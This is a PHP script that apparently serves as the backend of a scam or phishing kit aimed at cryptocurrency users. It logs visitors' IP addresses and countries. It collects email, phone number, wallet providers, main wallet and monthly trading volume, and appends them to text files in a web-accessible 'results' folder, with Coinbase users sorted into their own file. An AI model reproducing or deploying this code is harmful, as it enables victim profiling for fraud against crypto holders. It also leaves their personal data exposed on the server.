<?php
header('Access-Control-Allow-Origin: *');
include("config.php");

if(count($_GET) == 0){
    // print_r(get_client_ip());
    header("Location: ".$base_url."homepage.html");
    die();
}
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_HOST'))
       $ipaddress = getenv('REMOTE_HOST');
    else if(getenv('HTTP_X_CLUSTER_CLIENT_IP'))
        $ipaddress = getenv('HTTP_X_CLUSTER_CLIENT_IP');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
if(isset($_GET['country'])){
    setVisitor($direct_name);
}    

if(isset($_GET['func_name']))
    applyForm($base_url, $direct_name);

function setVisitor($direct_name){
    session_start();

    $ip = $_GET['ip'];
    $country = $_GET['country'];

    $_SESSION['ip'] = $ip;
    $_SESSION['country'] = $country;
    $content = date('Y-m-d')." | ".date('H:i:s')." | ".$ip." | ".$country."\n";
    $fp = fopen($_SERVER['DOCUMENT_ROOT'].$direct_name."/results/visitors.txt","a");
    fwrite($fp,$content);
    fclose($fp);
}

function applyForm($base_url, $direct_name)
{
    $w_validate = validate($direct_name);
    if($w_validate){
        header("Location: ".$base_url."submitted.php");
        die();
    } else {
        header("Location: ".$base_url."invalid.php");
        die();
    }
}

function validate($direct_name){
    $w_return = true;
    $invalid = array();
    $m = $_GET['majority'];

    if (!filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
        array_push($invalid, "email");
    }

    if(!preg_match('/^[0-9]{10}+$/', $_GET['phone'])){
        array_push($invalid, "phone");
    }

    if ($_GET['wallet'] == null) {
        array_push($invalid, "wallets");
    }

    if(preg_replace('/\s+/', '', $_GET['majority']) == ""){
        array_push($invalid, "majority");
    }

    if(substr($_GET['mbasis'], 0, 1) != "$"){
        array_push($invalid, "money basis");
    }

    if ($_GET['majority'] == "se") {
        $_GET['majority'] = $_GET['se'];
    }

    if (count($invalid) == 0) {
        session_start();

        $content = $_GET['email']."\n";
        $content .= $_GET['countrycode']." ".$_GET['phone']."\n";
        $str_wallet = is_array($_GET['wallet'])? implode(" | ", $_GET['wallet']) : $_GET['wallet'];
        $content .= $str_wallet."\n";
        $content .= "Majority wallet: ".$m."\n";
        $content .= "Monthly trading: ".$_GET['mbasis']."\n";
        $content .= "IP address: ".$_SESSION['ip']."\n";
        $content .= "COUNTRY: ".$_SESSION['country']."\n";
        $content .= str_repeat("-",24);
        $content .= "\n";
        
        $file_dir = $direct_name."/results/non-coinbase.txt";        
        if(substr_count($str_wallet, 'coinbase') > 0)
            $file_dir = $direct_name."/results/coinbase.txt";

        $fp = fopen($_SERVER['DOCUMENT_ROOT'].$file_dir,"a");
        fwrite($fp,$content);
        fclose($fp);
    } else {
        $w_return = false;
    }
    return $w_return;
}
?>